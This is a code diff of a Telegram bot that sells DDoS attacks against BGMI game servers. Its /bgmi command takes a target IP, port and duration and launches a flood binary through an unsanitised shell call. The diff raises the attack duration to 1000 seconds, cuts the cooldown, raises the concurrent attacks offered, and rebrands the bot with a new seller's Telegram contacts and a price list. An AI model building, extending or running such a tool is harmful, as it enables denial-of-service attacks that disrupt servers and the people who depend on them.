@@ -217,7 +217,7 @@ def start_attack_reply(message, target, port, time):
 # Dictionary to store the last time each user ran the /bgmi command
 bgmi_cooldown = {}
 
-COOLDOWN_TIME =20
+COOLDOWN_TIME =10
 
 # Handler for /bgmi command
 @bot.message_handler(commands=['bgmi'])
@@ -227,8 +227,8 @@ def handle_bgmi(message):
         # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 20:
-                response = "You Are On Cooldown ❌. Please Wait 20sec Before Running The /bgmi Command Again."
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 10:
+                response = "You Are On Cooldown ❌. Please Wait 10sec Before Running The /bgmi Command Again."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -239,19 +239,19 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Convert time to integer
             time = int(command[3])  # Convert port to integer
-            if time > 300:
-                response = "Error: Time interval must be less than 300."
+            if time > 1000:
+                response = "Error: Time interval must be less than 1000."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 500"
+                full_command = f"./bgmi {target} {port} {time} 400"
                 subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
+                response = f"BGMI Attack Finished SEND FEEDS TO @MikeyTDM. Target: {target} Port: {port} Port: {time}"
         else:
             response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
     else:
-        response = "❌ KHARIDA LO FIR USE KRO  ❌."
+        response = "❌ACESS MIL JAYEGA @MikeyTDM ❌."
 
     bot.reply_to(message, response)
 
@@ -273,7 +273,7 @@ def show_command_logs(message):
         except FileNotFoundError:
             response = "No command logs found."
     else:
-        response = "BHAI KYU UNGLI KR REHA HO ☠️."
+        response = "BASS OWNER KAR SKTA @MikeyTDM ☠️."
 
 
     bot.reply_to(message, response)
@@ -290,8 +290,8 @@ def show_help(message):
 🤖 To See Admin Commands:
 💥 /admincmd : Shows All Admin Commands.
 
-Buy From :- @SukhX_7171
-Official Channel :- https://t.me/MAFIAGAMING28
+Buy From :- @MikeyTDM
+Official Channel :- https://t.me/+I5FACBfviL1kZTQ1
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -306,9 +306,9 @@ Official Channel :- https://t.me/MAFIAGAMING28
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f'''👋🏻Welcome to MAFIA DDOS 🚀, {user_name}! SASTA HAI KHARID LO ABHI .
+    response = f'''👋🏻Welcome to FREE DDOS MADE BY ADMIN MIKEY 🚀, {user_name}!  .
 🤖Try To Run This Command : /help 
-✅Join :- https://t.me/MAFIAGAMING28'''
+✅Join :- https://t.me/+I5FACBfviL1kZTQ1'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
@@ -327,9 +327,9 @@ def welcome_plan(message):
     response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
 
 Vip 🌟 :
--> Attack Time : 300 (S)
+-> Attack Time : 1000 (S)
 > After Attack Limit : 5 Min
--> Concurrents Attack : 3
+-> Concurrents Attack : 10
 
 Pr-ice List💸 :
 Day-->300 Rs
